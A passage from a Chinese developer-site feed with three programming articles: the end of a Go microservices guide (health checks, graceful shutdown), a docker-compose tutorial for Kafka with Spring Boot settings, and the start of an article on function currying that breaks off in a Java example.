    <span class="hljs-comment">// 从密钥管理服务加载敏感信息</span>
    <span class="hljs-keyword">if</span> env == <span class="hljs-string">"production"</span> {
        secretClient, err := secretmanager.NewClient(context.Background())
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"创建密钥管理客户端失败: %w"</span>, err)
        }
        <span class="hljs-keyword">defer</span> secretClient.Close()
        
        <span class="hljs-comment">// 获取数据库连接字符串</span>
        dbSecret, err := accessSecretVersion(secretClient, <span class="hljs-string">"projects/project-id/secrets/db-url/versions/latest"</span>)
        <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
            config.DatabaseURL = dbSecret
        }
    }
    
    <span class="hljs-keyword">return</span> &amp;config, <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-15">健康检查与优雅关闭</h4>
<p>确保服务可维护性和可靠性：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> server

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"context"</span>
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"os/signal"</span>
    <span class="hljs-string">"syscall"</span>
    <span class="hljs-string">"time"</span>
)

<span class="hljs-keyword">type</span> HealthStatus <span class="hljs-keyword">struct</span> {
    Status    <span class="hljs-type">string</span>    <span class="hljs-string">`json:"status"`</span>
    Timestamp time.Time <span class="hljs-string">`json:"timestamp"`</span>
    Uptime    <span class="hljs-type">string</span>    <span class="hljs-string">`json:"uptime"`</span>
    Version   <span class="hljs-type">string</span>    <span class="hljs-string">`json:"version"`</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StartServerWithGracefulShutdown</span><span class="hljs-params">(addr <span class="hljs-type">string</span>, handler http.Handler)</span></span> {
    srv := &amp;http.Server{
        Addr:         addr,
        Handler:      handler,
        ReadTimeout:  <span class="hljs-number">15</span> * time.Second,
        WriteTimeout: <span class="hljs-number">30</span> * time.Second,
        IdleTimeout:  <span class="hljs-number">60</span> * time.Second,
    }
    
    <span class="hljs-comment">// 健康检查端点</span>
    http.HandleFunc(<span class="hljs-string">"/health"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
        status := HealthStatus{
            Status:    <span class="hljs-string">"healthy"</span>,
            Timestamp: time.Now(),
            Uptime:    time.Since(startTime).String(),
            Version:   <span class="hljs-string">"1.0.0"</span>,
        }
        
        w.Header().Set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json"</span>)
        json.NewEncoder(w).Encode(status)
    })
    
    <span class="hljs-comment">// 就绪检查端点</span>
    http.HandleFunc(<span class="hljs-string">"/ready"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
        <span class="hljs-keyword">if</span> isDatabaseConnected() &amp;&amp; isCacheAvailable() {
            w.WriteHeader(http.StatusOK)
            w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">"ready"</span>))
        } <span class="hljs-keyword">else</span> {
            w.WriteHeader(http.StatusServiceUnavailable)
            w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">"not ready"</span>))
        }
    })
    
    <span class="hljs-comment">// 优雅关闭处理</span>
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">if</span> err := srv.ListenAndServe(); err != <span class="hljs-literal">nil</span> &amp;&amp; err != http.ErrServerClosed {
            log.Fatalf(<span class="hljs-string">"服务器启动失败: %v"</span>, err)
        }
    }()
    
    quit := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> os.Signal, <span class="hljs-number">1</span>)
    signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
    &lt;-quit
    
    log.Println(<span class="hljs-string">"正在关闭服务器..."</span>)
    
    ctx, cancel := context.WithTimeout(context.Background(), <span class="hljs-number">30</span>*time.Second)
    <span class="hljs-keyword">defer</span> cancel()
    
    <span class="hljs-keyword">if</span> err := srv.Shutdown(ctx); err != <span class="hljs-literal">nil</span> {
        log.Fatalf(<span class="hljs-string">"服务器强制关闭: %v"</span>, err)
    }
    
    log.Println(<span class="hljs-string">"服务器已正常关闭"</span>)
}
</code></pre>
<h3 data-id="heading-16">总结：构建生产级Go微服务的完整路线图</h3>
<p>通过本文的全面探讨，我们构建了一个完整的Go语言云原生微服务开发框架。从语言特性优势到具体实现模式，从容器化部署到监控体系建设，再到安全与可靠性保障，每个环节都体现了Go语言在云原生领域的独特优势。</p>
<p>成功的微服务架构不仅需要技术实现，更需要良好的工程实践和组织协作。建议在实际项目中：</p>
<ol>
<li><strong>渐进式采用</strong>：从单体应用逐步拆分，避免过度微服务化</li>
<li><strong>标准化建设</strong>：建立统一的开发规范、部署流程和监控标准</li>
<li><strong>自动化优先</strong>：投资CI/CD流水线、基础设施即代码等自动化工具</li>
<li><strong>持续学习</strong>：跟踪Go语言和云原生生态的最新发展，适时引入新技术</li>
</ol>
<p>Go语言以其简洁性、高性能和强大的标准库，为构建现代化云原生应用提供了坚实的基础。结合本文介绍的最佳实践，开发团队可以构建出既满足当前需求，又具备良好扩展性和维护性的微服务系统。</p>
<p>记住，技术架构的最终目标是为业务价值服务。选择适合团队和业务场景的技术方案，保持架构的简单性和可演化性，才是构建成功系统的关键所在。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[linux环境下，使用docker安装apache kafka (docker-compose)]]></title>    <link>https://juejin.cn/post/7594851429162352674</link>    <guid>https://juejin.cn/post/7594851429162352674</guid>    <pubDate>2026-01-14T09:43:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429162352674" data-draft-id="7594785614177992744" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="linux环境下，使用docker安装apache kafka (docker-compose)"/> <meta itemprop="keywords" content="架构,Linux"/> <meta itemprop="datePublished" content="2026-01-14T09:43:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="优雅的38度"/> <meta itemprop="url" content="https://juejin.cn/user/3030682435332360"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            linux环境下，使用docker安装apache kafka (docker-compose)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030682435332360/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    优雅的38度
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:43:58.000Z" title="Wed Jan 14 2026 09:43:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>使用docker 创建kafka,达到项目中连接linux服务器创建的kafka，进行开发使用。
1.在linux中，在指定位置路径，创建docker-compose.yml文件，然后进行添加内容，我用的docker版本是26.1.1：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">zookeeper:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">confluentinc/cp-zookeeper:7.6.0</span>
    <span class="hljs-attr">hostname:</span> <span class="hljs-string">zookeeper</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">zookeeper</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"2181:2181"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">ZOOKEEPER_CLIENT_PORT:</span> <span class="hljs-number">2181</span>
      <span class="hljs-attr">ZOOKEEPER_TICK_TIME:</span> <span class="hljs-number">2000</span>

  <span class="hljs-attr">kafka:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">confluentinc/cp-kafka:7.6.0</span>
    <span class="hljs-attr">hostname:</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">zookeeper</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9092:9092"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"29092:29092"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">KAFKA_BROKER_ID:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="hljs-string">'zookeeper:2181'</span>
      <span class="hljs-attr">KAFKA_LISTENERS:</span> <span class="hljs-string">INTERNAL://0.0.0.0:29092,EXTERNAL://0.0.0.0:9092</span>
      <span class="hljs-attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="hljs-string">INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT</span>
      <span class="hljs-attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="hljs-string">INTERNAL://kafka:29092,EXTERNAL://{服务器IP}:9092</span>
      <span class="hljs-attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="hljs-string">INTERNAL</span>
      <span class="hljs-attr">KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS:</span> <span class="hljs-number">0</span>
      <span class="hljs-attr">KAFKA_TRANSACTION_STATE_LOG_MIN_ISR:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR:</span> <span class="hljs-number">1</span>
</code></pre>
<p>2.保存好docker-compose.yml</p>
<p>3.在docker-compose.yml文件目录下执行:docker-compose up -d</p>
<p>4.观察启动成功后，使用命令在linux服务器进行测试，</p>
<h2 data-id="heading-0">创建 topic （topic名字=test-topic）</h2>
<p>docker exec kafka kafka-topics --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1</p>
<h2 data-id="heading-1">生产消息（交互式）</h2>
<p>docker exec -it kafka kafka-console-producer --topic test-topic --bootstrap-server localhost:9092</p>
<p>-交互模式下输入kafka value,然后回车</p>
<h2 data-id="heading-2">消费消息（另开终端）</h2>
<p>docker exec -it kafka kafka-console-consumer --topic test-topic --bootstrap-server localhost:9092 --from-beginning</p>
<p>-输入消费信息命令后，在控制台观察输出，在生产者回车value后，消费者控制台会同步出现value</p>
<p>5.springBoot项目中配置kafka,供参考：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">kafka:</span>
  <span class="hljs-attr">topic:</span> <span class="hljs-string">kafka_topic_outputMessage</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">kafka:</span>
    <span class="hljs-attr">bootstrap-servers:</span> {<span class="hljs-string">kafka所在linux机器IP</span>}<span class="hljs-string">:9092</span>
    <span class="hljs-attr">producer:</span>
      <span class="hljs-attr">key-serializer:</span> <span class="hljs-string">org.apache.kafka.common.serialization.StringSerializer</span>
      <span class="hljs-attr">value-serializer:</span> <span class="hljs-string">org.apache.kafka.common.serialization.StringSerializer</span>
    <span class="hljs-attr">consumer:</span>
      <span class="hljs-attr">properties:</span>
        <span class="hljs-attr">group:</span>
          <span class="hljs-attr">id:</span> {<span class="hljs-string">消费者消费的组ID</span>}
      <span class="hljs-attr">key-deserializer:</span> <span class="hljs-string">org.apache.kafka.common.serialization.StringDeserializer</span>
      <span class="hljs-attr">value-deserializer:</span> <span class="hljs-string">org.apache.kafka.common.serialization.StringDeserializer</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[柯里化函数]]></title>    <link>https://juejin.cn/post/7594785614178107432</link>    <guid>https://juejin.cn/post/7594785614178107432</guid>    <pubDate>2026-01-14T09:48:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594785614178107432" data-draft-id="7595043061728428066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="柯里化函数"/> <meta itemprop="keywords" content="后端,设计模式"/> <meta itemprop="datePublished" content="2026-01-14T09:48:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="魅影骑士0010"/> <meta itemprop="url" content="https://juejin.cn/user/2356966533903384"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            柯里化函数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2356966533903384/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    魅影骑士0010
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:48:00.000Z" title="Wed Jan 14 2026 09:48:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71371c9a8a6140e0b3a487900f83038b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2F5b2x6aqR5aOrMDAxMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768988880&amp;x-signature=uzXBjbM0KgorcSNNFTDypeuIzW8%3D" alt="curriedFunction.png" loading="lazy"/></p>
<h2 data-id="heading-0">什么是柯里化？</h2>
<p>柯里化（Currying）是一种把“接收多个参数的函数”，转换成 <strong>“一系列每次只接收一个参数的函数”</strong> 的技术。</p>
<ul>
<li>定义：将 f(a, b, c) 转化为 f(a)(b)(c)</li>
<li>本质：利用闭包保存参数。</li>
<li>作用：固定部分参数以复用代码、延迟计算、方便函数组合。</li>
</ul>
<h2 data-id="heading-1">为什么要柯里化？</h2>
<ul>
<li>
<p>柯里化的核心优势在于 <strong>参数复用</strong> (让代码更具声明式特点，可读性更高) 和 <strong>延迟执行</strong>。</p>
<ul>
<li><em>参数复用：</em></li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 假设有一个通用的正则验证函数 check(reg, txt)</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">check</span> = reg =&gt; <span class="hljs-function"><span class="hljs-params">txt</span> =&gt;</span> reg.<span class="hljs-title function_">test</span>(txt);

<span class="hljs-comment">// 我们可以生成具体的验证函数</span>
<span class="hljs-keyword">const</span> checkEmail = <span class="hljs-title function_">check</span>(<span class="hljs-regexp">/^\S+@\S+$/</span>);
<span class="hljs-keyword">const</span> checkPhone = <span class="hljs-title function_">check</span>(<span class="hljs-regexp">/^1\d{10}$/</span>);

<span class="hljs-comment">// 以后使用时，只需要传具体的内容，逻辑非常清晰</span>
<span class="hljs-title function_">checkEmail</span>(<span class="hljs-string">'test@gmail.com'</span>); 
<span class="hljs-title function_">checkPhone</span>(<span class="hljs-string">'13800138000'</span>);
</code></pre>
<ul>
<li><em>延迟执行：</em> 你不需要一次性集齐所有参数。你可以先传一部分参数，让程序“记住”这种状态，等到合适的时机（剩下的参数准备好时）再计算最终结果。</li>
<li><em>函数组合：</em> 在函数式编程中，我们经常需要把多个简单的函数组合成一个复杂的函数（比如 f(g(x))）。因为柯里化后的函数总是只接受一个参数，这使得它们非常容易像积木一样拼在一起。</li>
</ul>
</li>
<li>
<p>提高函数复用性</p>
</li>
<li>
<p>更符合函数式编程（无状态、可组合、易测试）</p>
</li>
<li>
<p>让代码语义更清晰</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">request</span>(<span class="hljs-string">"GET"</span>)(<span class="hljs-string">"/api/user"</span>)({ <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span> });
</code></pre>
</li>
</ul>
<blockquote>
<p>柯里化在 Haskell、Lisp 等纯函数式语言中是默认行为，Scala 也是语言层面原生支持，而在 JavaScript、Python 等语言中则是一种强大的编程技巧。</p>
</blockquote>
<p>Scala（原生）：参数列表天然支持多段、类型系统知道这是柯里化函数：</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span></span>(a: <span class="hljs-type">Int</span>)(b: <span class="hljs-type">Int</span>) = a + b
add(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)
</code></pre>
<p>Haskell（彻底原生）：所有函数默认柯里化、多参数只是语法糖：</p>
<pre><code class="hljs language-haskell" lang="haskell">add a b = a + b
add 1 2
(add 1) 2
</code></pre>
<h2 data-id="heading-2">Java 方法的柯里化</h2>
<blockquote>
<p>Java 不是原生支持柯里化的语言，依赖 Java 8 引入的 Lambda 表达式 和 函数式接口（Function）来模拟，间接实现。</p>
<p>由于 Java 可读性、类型冗长问题，柯里化不是 Java 的强项。由于语言层面的限制，Java 没有自动类型推导，像（Scala / Kotlin），没有函数是“一等公民”的完整体验，泛型 + Function 嵌套非常啰嗦，导致 Java 不“推崇”柯里化，Java 更推崇偏函数（准确说是偏应用），参考后续文章。Java 设计哲学偏：命令式、显式、可维护性 &gt; 抽象美感。</p>
<p>不推荐：业务代码、CRUD、大多数后端服务逻辑使用柯里化，推荐：构建 DSL、高阶函数库（传入函数作为参数或返回函数的函数）、Stream / Pipeline 中的函数组合、需要“延迟绑定参数”使用柯里化。</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.function.Function;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogDemo</span> {
